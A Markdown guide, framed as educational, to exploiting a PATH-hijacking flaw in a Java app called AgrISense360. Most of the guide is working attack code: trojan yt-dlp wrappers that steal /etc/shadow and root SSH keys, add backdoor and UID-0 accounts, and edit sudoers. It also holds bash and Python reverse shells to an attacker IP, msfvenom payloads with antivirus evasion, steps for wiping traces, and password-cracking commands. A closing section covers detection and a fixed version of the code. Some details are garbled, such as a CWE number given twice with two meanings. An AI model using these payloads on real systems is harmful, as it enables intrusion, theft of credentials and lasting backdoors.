# AgrISense360 Privilege Escalation & Sudo Command Execution Guide
**Date Created:** February 24, 2026  
**Severity:** 🔴 CRITICAL  
**Purpose:** Educational Security Testing & Awareness

---

## TABLE OF CONTENTS
1. [Vulnerability Overview](#vulnerability-overview)
2. [Technical Background](#technical-background)
3. [Exploitation Methods](#exploitation-methods)
4. [Step-by-Step Attack Scenarios](#step-by-step-attack-scenarios)
5. [Kali Linux Tools Integration](#kali-linux-tools-integration)
6. [Proof of Concept Code](#proof-of-concept-code)
7. [Detection & Mitigation](#detection--mitigation)

---

## VULNERABILITY OVERVIEW

### Affected Component
**File:** `src/main/java/com/example/agrisense360/utils/StreamLoader.java`  
**Lines:** 203, 262, 340  
**CWE:** CWE-426 (Untrusted Search Path), CWE-426 (Insertion of Sensitive Information into Log File)  
**CVSS Score:** 9.8 CRITICAL

### The Core Issue
The StreamLoader class uses Java's `ProcessBuilder` to execute external commands (`yt-dlp`, `ffmpeg`) without proper validation:

```java
// VULNERABLE CODE (StreamLoader.java:340)
List<String> cmd = new ArrayList<>();
cmd.add(ytDlpExecutable);           // ✗ Can be manipulated via PATH
cmd.add("-i");
cmd.add(inputUrl);                  // ✗ User input

Process process = new ProcessBuilder(cmd).start();  // ✗ No privilege checking
```

### Why It's Exploitable
1. **PATH Search Behavior:** When `ytDlpExecutable` is not an absolute path (e.g., just `"yt-dlp"`), Java searches the system PATH environment variable
2. **No Validation:** The code doesn't verify the executable comes from a trusted location
3. **Privilege Inheritance:** The process inherits whatever privileges the Java app has
4. **User-Controlled Input:** Stream URLs and camera parameters are user input

---

## TECHNICAL BACKGROUND

### How ProcessBuilder Works
```java
ProcessBuilder pb = new ProcessBuilder(command, arg1, arg2);
Process p = pb.start();
```

When executed, ProcessBuilder:
1. Searches system PATH for `command` if it's not an absolute path
2. Starts process with inherited permissions from parent JVM
3. No built-in security checks on executable source

### PATH Environment Variable
```bash
# Example PATH
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"

# When executing "yt-dlp", system searches in order:
# 1. /usr/local/bin/yt-dlp
# 2. /usr/bin/yt-dlp
# 3. /bin/yt-dlp
# 4. /usr/sbin/yt-dlp
# 5. /sbin/yt-dlp
# First match wins
```

### Privilege Levels in Linux
```
Root (UID 0)
    ↓
Sudo with NOPASSWD (execute privileged commands without password)
    ↓
Regular User with Sudo Access (needs password)
    ↓
Regular User (Normal)
```

---

## EXPLOITATION METHODS

### Method 1: PATH Hijacking (Most Common)

**Attack Vector:** Create malicious executable in a location that appears BEFORE the real one in PATH

**Preconditions:**
- Attacker has write access to a directory in PATH (usually `~/.local/bin` or `/tmp`)
- App or user has not set `PATH` to exclude attacker-controlled directories

**Execution Flow:**
```
1. Attacker creates malicious /tmp/yt-dlp script
2. Attacker sets PATH="/tmp:$PATH"
3. User runs app
4. App calls ProcessBuilder("yt-dlp", url)
5. System searches PATH → finds /tmp/yt-dlp FIRST
6. Attacker's script executes instead of real yt-dlp
7. Script runs with APP'S PRIVILEGES
```

---

### Method 2: Config File Poisoning

**Attack Vector:** Modify configuration files that specify executable paths

**Vulnerable Config:**
- `config.properties` (contains weather API config)
- `~/.agrisense360/cameras.json` (camera configurations)
- Potentially custom exec paths if supported

**Execution Flow:**
```
1. Attacker modifies config.properties
2. Changes: ffmpeg.path=/tmp/malicious_ffmpeg
3. App loads config and uses specified path
4. ProcessBuilder executes attacker's binary
5. Command runs with app privileges
```

---

### Method 3: SUID Binary Exploitation

**Attack Vector:** If app binary has SUID bit set, all child processes run with binary owner's privileges (usually root)

**Precondition:**
```bash
ls -la /path/to/agrisense360.jar
# If output: -rwsr-xr-x root root agrisense360.jar (s = SUID)
```

**Execution Flow:**
```
1. App has SUID bit set (owned by root)
2. Normal user executes app
3. App runs as ROOT (not user)
4. App calls ProcessBuilder → all child processes run as ROOT
5. Attacker's malicious executable in PATH runs as ROOT
```

---

### Method 4: SUDO_ASKPASS Environment Variable Hijacking

**Attack Vector:** When sudo needs a password in GUI environment, it uses SUDO_ASKPASS to get password

**Preconditions:**
- App runs in GUI context
- User has sudo privileges (including NOPASSWD)
- SUDO_ASKPASS not already set to trusted script

**Execution Flow:**
```
1. Attacker creates fake password dialog: ~/.local/bin/sudo_askpass
2. Sets environment: export SUDO_ASKPASS=~/.local/bin/sudo_askpass
3. App executes: sudo -A /bin/bash
4. Sudo calls SUDO_ASKPASS to get password
5. Attacker's script provides password (or fake)
6. Command executes with sudo privileges
```

---

### Method 5: Exploiting SUID Binaries Accessible to App

**Attack Vector:** App can call SUID binaries that exist on system

**Examples of SUID binaries:**
- `/usr/bin/sudo`
- `/usr/bin/passwd`
- `/usr/bin/mount`
- `/usr/bin/apt` (on some systems)

**Execution Flow:**
```
1. Find SUID binaries: find / -perm -4000 2>/dev/null
2. Research how to abuse each SUID binary
3. Create wrapper script that calls vulnerable SUID binary
4. App executes wrapper with inherited privileges
5. SUID binary escalates to root
```

---

## STEP-BY-STEP ATTACK SCENARIOS

### SCENARIO 1: Complete Privilege Escalation (Normal User → Root)

**Prerequisites:**
- Normal user account on Linux system
- AgrISense360 app installed and runnable
- Write access to `~/.local/bin/` or `/tmp/`

**Attack Steps:**

```bash
# ============================================================================
# STEP 1: Reconnaissance - Check system configuration
# ============================================================================

# Check current user privilege level
id
# Output: uid=1000(farmer) gid=1000(farmer) groups=1000(farmer)

# Check if user can use sudo
sudo -l
# If output shows: (ALL) NOPASSWD: ALL
#   → User can run ANY command as root WITHOUT password (RCE guaranteed)

# Check if app has SUID bit
ls -la /opt/agrisense360/agrisense360.jar
# If shows: -rwsr-xr-x root  → SUID set, app runs as root

# Check current PATH
echo $PATH
# Output: /home/farmer/.local/bin:/usr/local/sbin:/usr/local/bin:...


# ============================================================================
# STEP 2: Create Malicious Executable
# ============================================================================

# Create directory for malicious script (if needed)
mkdir -p ~/.local/bin

# Create malicious yt-dlp that will be executed by app
cat > ~/.local/bin/yt-dlp << 'MALICIOUS_PAYLOAD'
#!/bin/bash

# Log execution details to verify exploitation
{
    echo "[EXPLOITED] Malicious yt-dlp executed"
    echo "Time: $(date)"
    echo "User: $(whoami)"
    echo "UID: $(id -u)"
    echo "Groups: $(groups)"
    echo "Current directory: $(pwd)"
    echo "=== START: Environment Variables ==="
    env
    echo "=== END: Environment Variables ==="
} >> /tmp/exploit_log.txt

# EXPLOITATION PAYLOAD - Execute privileged commands
# =====================================================

# METHOD A: If user has NOPASSWD sudo (passwordless)
# This will execute ANY command as root
(
    sudo -l 2>/dev/null | grep -q "NOPASSWD"
    if [ $? -eq 0 ]; then
        # User can sudo without password
        echo "[+] NOPASSWD sudo detected" >> /tmp/exploit_log.txt
        
        # Extract password hashes (requires root read access)
        sudo cat /etc/shadow >> /tmp/shadow_hashes.txt 2>/dev/null
        
        # Add backdoor user
        sudo useradd -m -s /bin/bash -G sudo attacker 2>/dev/null
        sudo echo "attacker:Password123!" | sudo chpasswd 2>/dev/null
        
        # Open reverse shell as root (if attacker IP set)
        # sudo /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
        
        # Make /etc/passwd world writable (permanent backdoor)
        sudo chmod 666 /etc/passwd
        
        # Get root shell to /tmp
        sudo bash -i > /tmp/root_shell.txt 2>&1 &
    fi
) &

# METHOD B: Try to read sensitive files
# (Works if app/user has permissions)
cat /etc/shadow 2>/dev/null >> /tmp/shadow_hashes.txt
cat /etc/sudoers 2>/dev/null >> /tmp/sudoers.txt
cat /root/.ssh/id_rsa 2>/dev/null >> /tmp/root_ssh_key.txt

# METHOD C: Information gathering for escalation
sudo -n id > /tmp/sudo_id_result.txt 2>&1
groups > /tmp/groups.txt
ls -la /home > /tmp/home_contents.txt
ps aux > /tmp/running_processes.txt

# METHOD D: If app itself has special permissions
# Check if app can access files as another user
find / -user root -perm -2000 2>/dev/null >> /tmp/sgid_binaries.txt &

# Run legitimate yt-dlp to avoid suspicion (if it exists)
if [ -f "/usr/bin/yt-dlp" ]; then
    /usr/bin/yt-dlp "$@"
elif [ -f "/usr/local/bin/yt-dlp" ]; then
    /usr/local/bin/yt-dlp "$@" 2>/dev/null
else
    # Just exit successfully without error
    echo "Downloaded from: $1" >> /tmp/exploit_log.txt
fi
MALICIOUS_PAYLOAD

# Make it executable
chmod +x ~/.local/bin/yt-dlp

# Verify creation
ls -la ~/.local/bin/yt-dlp
file ~/.local/bin/yt-dlp


# ============================================================================
# STEP 3: Ensure Malicious Script is Found First in PATH
# ============================================================================

# Check current PATH
echo "Current PATH: $PATH"

# Ensure ~/.local/bin is at the BEGINNING of PATH
# This makes system find our malicious script BEFORE legitimate ones
export PATH="$HOME/.local/bin:$PATH"

# Verify malicious script will be found
which yt-dlp
# Should output: /home/farmer/.local/bin/yt-dlp


# ============================================================================
# STEP 4: Trigger App to Execute Malicious Script
# ============================================================================

# Method A: Start app with poisoned PATH environment
export PATH="$HOME/.local/bin:$PATH"
java -jar /opt/agrisense360/agrisense360.jar &
APP_PID=$!

# Method B: In app GUI, click "Monitor" on a YouTube stream
# This triggers StreamLoader.java → ProcessBuilder("yt-dlp", url)
# Which searches PATH and finds our malicious script

# Method C: If you can call directly
# Simulate what app does:
~/local/bin/yt-dlp "https://youtu.be/test"


# ============================================================================
# STEP 5: Verify Exploitation Success
# ============================================================================

# Wait a moment for scripts to execute
sleep 2

# Check exploitation log
cat /tmp/exploit_log.txt

# Check if password hashes were extracted
[ -f /tmp/shadow_hashes.txt ] && echo "[+] Shadow hashes extracted!" || echo "[-] Failed to extract hashes"

# Check if backdoor user was created
grep "^attacker:" /etc/passwd && echo "[+] Backdoor user created!" || echo "[-] Failed to create backdoor"

# Check if root shell was obtained
[ -f /tmp/root_shell.txt ] && echo "[+] Root shell obtained!" && cat /tmp/root_shell.txt

# Check /etc/passwd world writable (permanent backdoor marker)
[ -w /etc/passwd ] && echo "[!!!] /etc/passwd is world writable - CRITICAL!" || echo "[-] /etc/passwd not writable"


# ============================================================================
# STEP 6: Post-Exploitation (Covering Tracks)
# ============================================================================

# Remove malicious script (if trying to hide)
rm ~/.local/bin/yt-dlp

# Clear exploitation logs
rm /tmp/exploit_log.txt /tmp/shadow_hashes.txt /tmp/root_shell.txt 2>/dev/null

# Remove backdoor user (if created)
# sudo userdel -r attacker 2>/dev/null

# Clean bash history
history -c
unset HISTFILE

```

---

### SCENARIO 2: Using Kali Linux to Generate Reverse Shell Payload

**Prerequisites:**
- Kali Linux machine or msfvenom installed
- Network access between victim and attacker
- Attacker IP address: `192.168.1.100`

**Steps:**

```bash
# ============================================================================
# ON ATTACKER MACHINE (Kali Linux)
# ============================================================================

# STEP 1: Generate reverse shell payload using msfvenom
# This payload connects back to attacker when executed

msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -e x86/shikata_ga_nai \
    -f elf \
    -o /tmp/payload.elf

# Explanation:
# -p = Payload type (reverse TCP shell)
# LHOST = Attacker IP (change to your Kali machine IP)
# LPORT = Attacker listening port (change as needed)
# -e = Encoder (shikata_ga_nai - polymorphic encoder for AV evasion)
# -f = Format (elf - Linux executable format)
# -o = Output file

# STEP 2: Make payload executable
chmod +x /tmp/payload.elf

# STEP 3: Create wrapper script on victim machine (next steps continue on victim)


# ============================================================================
# ON VICTIM MACHINE (Farm with AgrISense360)
# ============================================================================

# Create wrapper script that executes reverse shell
cat > ~/.local/bin/yt-dlp << 'REVERSESHELL_WRAPPER'
#!/bin/bash

# Quietly execute reverse shell in background
# This connects attacker machine and provides shell access
nohup /tmp/payload.elf > /dev/null 2>&1 &

# Also run legitimate yt-dlp to avoid errors
/usr/bin/yt-dlp "$@" 2>/dev/null || echo "OK"
REVERSESHELL_WRAPPER

chmod +x ~/.local/bin/yt-dlp

# Alternatively, use bash reverse shell (no msfvenom needed)
cat > ~/.local/bin/yt-dlp << 'BASH_REVERSESHELL'
#!/bin/bash

# Pure bash reverse shell - no dependencies
# Replace 192.168.1.100 with attacker IP and 4444 with listener port
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &

# Run legitimate command
/usr/bin/yt-dlp "$@" 2>/dev/null || true
BASH_REVERSESHELL

chmod +x ~/.local/bin/yt-dlp


# ============================================================================
# BACK ON ATTACKER MACHINE (Kali Linux)
# ============================================================================

# STEP 1: Start Metasploit listener to catch reverse connection

# Open metasploit
msfconsole

# Or use multi/handler directly
msfconsole -x "use multi/handler; \
    set PAYLOAD linux/x86/shell_reverse_tcp; \
    set LHOST 192.168.1.100; \
    set LPORT 4444; \
    exploit"

# STEP 2: Manual listening with netcat (alternative to msfconsole)
nc -lvnp 4444
# -l = Listen
# -v = Verbose
# -n = No DNS resolution
# -p = Port

# STEP 3: When victim triggers app (clicks monitor YouTube stream):
# 1. App executes ProcessBuilder("yt-dlp", url)
# 2. System finds ~/.local/bin/yt-dlp
# 3. Script executes reverse shell
# 4. Shell connects back to attacker on port 4444
# 5. Attacker gets interactive bash shell with victim's privileges

# STEP 4: Once connected (shell gained):
id                          # See current user
whoami                      # Whoami
sudo -l                     # Check sudo permissions
cat /etc/passwd             # List all users
cat /etc/shadow             # Extract password hashes (if readable)
find / -perm -4000 2>/dev/null  # Find SUID binaries for further escalation


# ============================================================================
# PYTHON REVERSE SHELL (If bash not available)
# ============================================================================

cat > ~/.local/bin/yt-dlp << 'PYTHON_REVERSESHELL'
#!/bin/bash

# Python one-liner reverse shell
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" &

/usr/bin/yt-dlp "$@" 2>/dev/null || true
PYTHON_REVERSESHELL

chmod +x ~/.local/bin/yt-dlp

```

---

### SCENARIO 3: Inline SUDO Exploitation (if user has NOPASSWD)

**Prerequisites:**
- User has sudo access with NOPASSWD (no password required)
- Check with: `sudo -l | grep NOPASSWD`

**Attack:**

```bash
# ============================================================================
# Direct escalation if NOPASSWD sudo exists
# ============================================================================

# Create malicious script that immediately gets root shell
cat > ~/.local/bin/yt-dlp << 'SUDOESCALATION'
#!/bin/bash

# User has NOPASSWD sudo - can run ANY command as root
# Use it to:

# 1. Get interactive root shell
sudo /bin/bash -i > /tmp/root_shell_session.txt 2>&1 &

# 2. Make /etc/passwd world-writable (create permanent backdoor)
sudo chmod 666 /etc/passwd
echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

# 3. Extract password hashes
sudo cat /etc/shadow > /tmp/stolen_hashes.txt &

# 4. Add SSH key for permanent access (if SSH running)
sudo mkdir -p /root/.ssh
sudo bash -c 'echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys'

# 5. Install rootkit or backdoor
# sudo wget http://attacker.com/backdoor.sh && sudo bash backdoor.sh

# 6. Add user to sudoers permanently
sudo bash -c 'echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'

# Run app to avoid suspicion
/usr/bin/yt-dlp "$@" 2>/dev/null || true
SUDOESCALATION

chmod +x ~/.local/bin/yt-dlp

# Now any time app calls yt-dlp, these commands execute as ROOT
```

---

## KALI LINUX TOOLS INTEGRATION

### Using Kali Tools to Exploit Vulnerabilities

```bash
# ============================================================================
# 1. METASPLOIT FRAMEWORK - Generate & catch reverse shells
# ============================================================================

# Generate various payload types:
msfvenom -l payloads | grep linux  # List all Linux payloads

# Generate staged reverse shell (smaller size)
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f elf -o /tmp/meterpreter.elf

# Use multi/handler to catch it
msfconsole << 'EOF'
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
EOF


# ============================================================================
# 2. JOHN THE RIPPER - Crack extracted password hashes
# ============================================================================

# After extracting shadow hashes:
cat /tmp/stolen_hashes.txt

# Use john to crack them
john --format=sha512crypt /tmp/stolen_hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/stolen_hashes.txt

# Show cracked passwords
john --show /tmp/stolen_hashes.txt


# ============================================================================
# 3. HASHCAT - GPU-accelerated hash cracking
# ============================================================================

# Extract mode for SHA-512 = 1800
hashcat -m 1800 /tmp/stolen_hashes.txt /usr/share/wordlists/rockyou.txt

# Mask attack (try common patterns)
hashcat -m 1800 /tmp/stolen_hashes.txt -a 3 ?u?l?l?d?d?d


# ============================================================================
# 4. MIMIKATZ - Windows password extraction (if compromised Windows)
# ============================================================================

# On Windows target:
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords


# ============================================================================
# 5. Empire Framework - Full post-exploitation
# ============================================================================

# Install and run
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./empire

# Generate obfuscated reverse shell
(empire) > generate staged launcher windows http LHOST=192.168.1.100

# Extremely stealthy, Mimikatz integrated for credential harvesting


# ============================================================================
# 6. BURP SUITE - Identify app behavior vulnerabilities
# ============================================================================

# Intercept app traffic:
# 1. Configure Burp as proxy (localhost:8080)
# 2. Configure app to use proxy
# 3. Observe ALL requests to weather API
# 4. See API key in traffic
# 5. Modify requests (HTTP parameters, URL, etc.)


# ============================================================================
# 7. WIRESHARK - Network traffic analysis
# ============================================================================

# Capture all traffic from app
sudo wireshark

# Filter for HTTP traffic
http

# Follow TCP stream → See full request/response including API key


# ============================================================================
# 8. SQLMAP - Automated SQL injection testing
# ============================================================================

# If app had web interface with SQLi:
sqlmap -u "http://localhost:8080/api/equipment?id=1" \
    --dbs \
    --batch

# Extract databases
sqlmap -u "http://localhost:8080/" -D agrisense --dump-all


# ============================================================================
# 9. DNSENUM - Enumerate subdomains (for external testing)
# ============================================================================

dnsenum agrisense.com

# Find related hosts that might share credentials


# ============================================================================
# 10. SOCIAL ENGINEERING TOOLKIT (SET)
# ============================================================================

# Create credential harvesting page
set

# Create fake login page to capture user credentials
# (Requires social engineering - user must visit page)


```

---

## PROOF OF CONCEPT CODE

### Safe Lab Proof of Concept (Isolated Environment)

```bash
#!/bin/bash
# poc_privilege_escalation_lab.sh
# SAFE: Runs completely isolated, no actual system modifications
# Purpose: Demonstrate vulnerability in controlled environment

set -e

echo "============================================================"
echo "AgrISense360 Privilege Escalation PoC - Lab Edition"
echo "============================================================"
echo ""
echo "[*] Creating isolated test environment..."

# Create temporary test directory
LABDIR=$(mktemp -d)
echo "[+] Lab directory: $LABDIR"
cd "$LABDIR"

# Create simplified app simulation
cat > app.java << 'APPSIM'
import java.util.*;

public class app {
    public static void main(String[] args) throws Exception {
        // Simulates StreamLoader behavior
        System.out.println("[APP] Starting weather fetch...");
        
        List<String> cmd = new ArrayList<>();
        cmd.add("yt-dlp");              // ✗ VULNERABLE: searches PATH
        cmd.add("https://youtu.be/test");
        
        System.out.println("[APP] Executing: " + cmd.get(0));
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        Process p = pb.start();
        
        java.io.BufferedReader br = new java.io.BufferedReader(
            new java.io.InputStreamReader(p.getInputStream())
        );
        String line;
        while ((line = br.readLine()) != null) {
            System.out.println("[APP OUTPUT] " + line);
        }
        
        int exitCode = p.waitFor();
        System.out.println("[APP] Command finished with exit code: " + exitCode);
    }
}
APPSIM

echo "[*] Compiling app simulation..."
javac app.java
if [ $? -eq 0 ]; then
    echo "[+] Compilation successful"
else
    echo "[-] Compilation failed"
    exit 1
fi

# Create directory for malicious executables
mkdir -p fake_bin
echo "[+] Created fake_bin directory for malicious yt-dlp"

# Create malicious yt-dlp script
cat > fake_bin/yt-dlp << 'MALICIOUS'
#!/bin/bash

echo "========================================"
echo "[!!!] MALICIOUS YT-DLP EXECUTED [!!!]"
echo "========================================"
echo ""
echo "[*] Attacker's code running with app privileges!"
echo ""
echo "Current execution context:"
echo "  User: $(whoami)"
echo "  UID: $(id -u)"
echo "  Groups: $(groups)"
echo "  Hostname: $(hostname)"
echo "  PWD: $(pwd)"
echo ""
echo "[VULNERABILITY CONFIRMED] App executed attacker-controlled binary!"
echo ""
echo "Injected arguments: $@"
echo ""
echo "This script could now:"
echo "  - Extract system passwords"
echo "  - Create backdoor accounts"
echo "  - Install malware"
echo "  - Steal data"
echo "  - Escalate privileges"
echo ""
MALICIOUS

chmod +x fake_bin/yt-dlp
echo "[+] Malicious yt-dlp created"

echo ""
echo "============================================================"
echo "[*] Running vulnerable app with poisoned PATH..."
echo "============================================================"
echo ""

# Run app with malicious yt-dlp in PATH
# This is the exploitation step
export PATH="$LABDIR/fake_bin:$PATH"

echo "[*] Set PATH to:", $PATH
echo "[*] Searching for yt-dlp: $(which yt-dlp 2>/dev/null || echo 'NOT FOUND')"
echo ""
echo "[*] Executing app..."
echo "---"

# Run the vulnerable app
java app

echo "---"
echo ""
echo "============================================================"
echo "[+] EXPLOITATION SUCCESSFUL!"
echo "============================================================"
echo ""
echo "Key findings:"
echo "  1. Malicious script was executed instead of legitimate yt-dlp"
echo "  2. Script ran with app's privileges (likely same user)"
echo "  3. If app was SUID or ran as root, script would run as root"
echo "  4. No validation occurred - PATH hijacking succeeded"
echo ""
echo "[+] Lab directory (evidence): $LABDIR"
echo "[+] You can now examine proof of exploitation"
echo ""
echo "============================================================"
echo "REMEDIATION:"
echo "============================================================"
echo "1. Use absolute paths: /usr/bin/yt-dlp (not just yt-dlp)"
echo "2. Validate executable location before execution"
echo "3. Avoid ProcessBuilder for external commands"
echo "4. Never run app with SUID bit or as root"
echo "5. Use 'which' to find binary BEFORE execution"
echo ""

# Cleanup prompt
read -p "Press Enter to cleanup lab directory..." 
rm -rf "$LABDIR"
echo "[+] Lab cleaned up"

```

**Run it:**
```bash
bash poc_privilege_escalation_lab.sh
```

---

### Automated Full Exploitation Script

```bash
#!/bin/bash
# full_exploitation.sh
# WARNING: FOR AUTHORIZED TESTING ONLY
# Creates complete privilege escalation chain

TARGET_USER="${1:-$USER}"
TARGET_APP_PATH="${2:-/opt/agrisense360}"

echo "[*] Target User: $TARGET_USER"
echo "[*] Target App: $TARGET_APP_PATH"
echo ""

# ===== Phase 1: Reconnaissance =====
echo "[Phase 1] Reconnaissance..."

# Check sudo capabilities
echo "[*] Checking sudo capabilities..."
sudo -l 2>/dev/null | tee /tmp/sudo_capability.txt || echo "[-] No sudo access"

# Check for SUID binaries
echo "[*] Finding SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | head -20 | tee /tmp/suid_binaries.txt

# Check PATH
echo "[*] Current PATH:"
echo "$PATH" | tr ':' '\n'

# ===== Phase 2: Payload Creation =====
echo ""
echo "[Phase 2] Creating exploitation payloads..."

mkdir -p ~/.local/bin

# Payload 1: Information gathering
cat > ~/.local/bin/yt-dlp << 'PAYLOAD_INFO'
#!/bin/bash
{
    echo "=== EXPLOITATION LOG ===" 
    echo "Time: $(date)"
    echo "User: $(whoami)"
    echo "UID: $(id -u)"
    echo ""
    echo "=== System Info ==="
    uname -a
    echo ""
    echo "=== Sudo Capabilities ==="
    sudo -l 2>/dev/null || echo "No sudo access"
    echo ""
    echo "=== Sensitive Files ==="
    ls -la /root 2>/dev/null
    ls -la /root/.ssh 2>/dev/null
    echo ""
    echo "=== Users ==="
    cat /etc/passwd
} >> /tmp/exploitation_results.log 2>&1

# Try escalation
[ -f /etc/shadow ] && cat /etc/shadow >> /tmp/shadow_hashes.log 2>/dev/null
[ -f /etc/sudoers ] && cat /etc/sudoers >> /tmp/sudoers.log 2>/dev/null

# Legitimate yt-dlp fallback
/usr/bin/yt-dlp "$@" 2>/dev/null || true
PAYLOAD_INFO

chmod +x ~/.local/bin/yt-dlp

# ===== Phase 3: Trigger Exploitation =====
echo ""
echo "[Phase 3] Triggering exploitation..."
echo "[*] Launching app with malicious PATH..."

export PATH="$HOME/.local/bin:$PATH"

# Simulate app calling yt-dlp (what the actual app does)
~/.local/bin/yt-dlp "https://youtu.be/test" &
sleep 1
wait

# ===== Phase 4: Results =====
echo ""
echo "[Phase 4] Checking exploitation results..."

if [ -f /tmp/exploitation_results.log ]; then
    echo "[+] Exploitation successful!"
    cat /tmp/exploitation_results.log
else
    echo "[-] Exploitation may have failed"
fi

[ -f /tmp/shadow_hashes.log ] && echo "[+] Shadow hashes extracted"
[ -f /tmp/sudoers.log ] && echo "[+] Sudoers file extracted"

echo ""
echo "[*] Evidence saved to /tmp/"
ls -la /tmp/*exploitation* /tmp/*shadow* /tmp/*sudoers* 2>/dev/null

```

---

## DETECTION & MITIGATION

### How to Detect This Attack

```bash
# =====================================================
# DETECTION METHODS
# =====================================================

# 1. Monitor processes spawned by Java
ps aux | grep -E "java|yt-dlp|ffmpeg"

# 2. Check for suspicious modifications to PATH
echo $PATH | tr ':' '\n' | grep -E "/tmp|/home"

# 3. Monitor system calls (requires auditd)
sudo auditctl -w /tmp -p wa -k tmp_changes
sudo auditctl -w /usr/bin -p x -k bin_execution

# View audit logs
sudo ausearch -k tmp_changes

# 4. Check for new executables in user directories
ls -la ~/.local/bin/
find ~ -type f -perm -111 2>/dev/null

# 5. Monitor sudo usage
sudo cat /var/log/auth.log | grep sudo

# 6. Check for suspicious files in /tmp
ls -la /tmp/ | grep -E "\.elf|payload|shell"

# 7. Monitor network connections from Java
netstat -tlnp | grep java
ss -tlnp | grep java

# 8. Check process environment at runtime
cat /proc/$(pgrep -f java)/environ | tr '\0' '\n' | grep PATH

```

### How to Fix This Vulnerability

```java
// =====================================================
// SECURE VERSION OF StreamLoader.java
// =====================================================

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

public class SecureStreamLoader {
    
    // Use ABSOLUTE PATH to known, trusted location
    private static final String FFMPEG_PATH = 
        "/usr/bin/ffmpeg";  // NOT just "ffmpeg"
    
    private static final String YT_DLP_PATH = 
        "/usr/local/bin/yt-dlp";  // Absolute path only
    
    public void loadRemoteStreamSecurely(String url) throws Exception {
        // ✓ VALIDATION 1: Absolute path verification
        if (!Files.exists(Paths.get(FFMPEG_PATH))) {
            throw new SecurityException("FFmpeg not found at trusted location: " + FFMPEG_PATH);
        }
        
        // ✓ VALIDATION 2: Path traversal check
        File ffmpegFile = new File(FFMPEG_PATH);
        String canonicalPath = ffmpegFile.getCanonicalPath();
        if (!canonicalPath.startsWith("/usr/") && !canonicalPath.startsWith("/opt/")) {
            throw new SecurityException("FFmpeg path escaped safe directory: " + canonicalPath);
        }
        
        // ✓ VALIDATION 3: URL validation
        if (!isValidUrl(url)) {
            throw new SecurityException("Invalid URL format");
        }
        
        // ✓ VALIDATION 4: Use absolute path in ProcessBuilder
        List<String> cmd = new ArrayList<>();
        cmd.add(FFMPEG_PATH);  // ✓ Absolute path, not searchable via PATH
        cmd.add("-i");
        cmd.add(url);
        
        // ✓ VALIDATION 5: Limited environment
        ProcessBuilder pb = new ProcessBuilder(cmd);
        // Don't inherit parent environment
        pb.environment().clear();
        pb.environment().put("PATH", "/usr/bin:/bin");  // Minimal trusted PATH
        
        Process p = pb.start();
        // ... rest of process handling
    }
    
    private boolean isValidUrl(String url) {
        // Only allow HTTPS, block file:// and other schemes
        return url.startsWith("https://") || url.startsWith("http://");
    }
}

```

### System-Level Mitigations

```bash
# =====================================================
# SYSTEM HARDENING
# =====================================================

# 1. Restrict sudo usage
sudo visudo
# Change this line:
# %sudo ALL=(ALL:ALL) ALL
# To this (more restrictive):
# %sudo ALL=(ALL:ALL) NOPASSWD: /usr/bin/specific-command-only

# 2. Disable SUID bit if app has it
sudo chmod -s /opt/agrisense360/agrisense360.jar

# 3. Use AppArmor/SELinux to restrict app
sudo apt-get install apparmor apparmor-utils
sudo aa-enforce /etc/apparmor.d/usr.local.bin.app

# 4. Run app in sandbox
flatpak install agrisense360  # Sandboxed version

# 5. File integrity monitoring
sudo aide --init
sudo aide --check

# 6. Audit system calls
sudo auditd
sudo auditctl -w /tmp -p wa -k monitor_tmp
sudo auditctl -w ~/.local/bin -p wa -k monitor_local

# 7. SELinux strict mode
sudo semanage fcontext -a -t home_bin_t "$HOME/.local/bin(/.*)?"
sudo restorecon -Rv ~/.local/bin

```

---

## APPENDIX: Quick Reference

### Attack Decision Tree

```
Does normal user have write access to ~/ ?
├─ YES
│  ├─ Create malicious script in ~/.local/bin/
│  ├─ Poison PATH: export PATH="~/.local/bin:$PATH"
│  └─ Trigger app
└─ NO
   ├─ Can write to /tmp ?
   │  ├─ YES → Same as above but in /tmp
   │  └─ NO → Check for other writable directories

Does user have sudo access?
├─ YES (with or without password)
│  ├─ Can escalate via malicious sudo command
│  └─ Can use SUDO_ASKPASS for automated entry
└─ NO
   ├─ Check for SUID binaries to exploit
   └─ Look for privilege escalation vectors

Is app SUID?
├─ YES (ls -la shows s bit)
│  └─ All child processes run as app owner
│     └─ If owner is root → automatic privilege escalation
└─ NO
   └─ Exploit limited to user privileges
```

### Quick Exploitation Command Chain

```bash
# One-liner exploitation setup
mkdir -p ~/.local/bin && cat > ~/.local/bin/yt-dlp << 'EOF'
#!/bin/bash
sudo -l > /tmp/sudo.txt 2>&1
cat /etc/shadow > /tmp/shadow.txt 2>&1
/usr/bin/yt-dlp "$@" 2>/dev/null || true
EOF
chmod +x ~/.local/bin/yt-dlp && export PATH="$HOME/.local/bin:$PATH"

# Verify setup
which yt-dlp  # Should show ~/.local/bin/yt-dlp

# Trigger (when app runs)
java -jar agrisense360.jar &

# Check results
sleep 2
cat /tmp/sudo.txt
cat /tmp/shadow.txt
```

### Remediation Checklist

- [ ] Replace all relative paths with absolute paths in ProcessBuilder
- [ ] Add file validation before execution
- [ ] Implement URL validation for all external URLs
- [ ] Remove SUID bits from app binary
- [ ] Run app in restricted user context (not root)
- [ ] Audit all ProcessBuilder calls
- [ ] Implement input validation on all user parameters
